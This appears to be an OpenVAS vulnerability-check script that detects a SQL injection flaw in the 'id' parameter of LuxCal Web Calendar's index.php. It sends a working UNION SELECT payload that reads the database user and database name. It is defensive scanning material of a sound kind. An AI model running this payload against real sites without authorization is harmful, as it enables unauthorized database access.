##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_luxcal_web_calendar_sql_inj_vuln.nasl 12006 2018-10-22 07:42:16Z mmartin $
#
# LuxCal Web Calendar SQL Injection Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802307");
  script_version("$Revision: 12006 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 09:42:16 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("LuxCal Web Calendar SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45152");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17500/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"LuxCal Web Calendar version 2.4.2 to 2.5.0");
  script_tag(name:"insight", value:"The flaw is due to input passed via the 'id' parameter to
  'index.php', which is not properly sanitised before being used in a SQL query.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running LuxCal Web Calendar and is prone to SQL
  injection vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir(make_list_unique("/luxcal", "/cal", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:port);

  if(egrep(pattern:"LuxCal Web Calendar", string:rcvRes))
  {
    exploit = string("/index.php?xP=11&id=-326415+union+all+select+1,2,",
                     "0x4f70656e564153,user(),5,database(),7,8,9,10,11,12,13,",
                     "14,15,16,17,18,19,20,21,22,23,24,25,26,27--");

    sndReq = http_get(item:string(dir, exploit), port:port);
    rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

    if(">Title:<" >< rcvRes && ">OpenVAS<" >< rcvRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);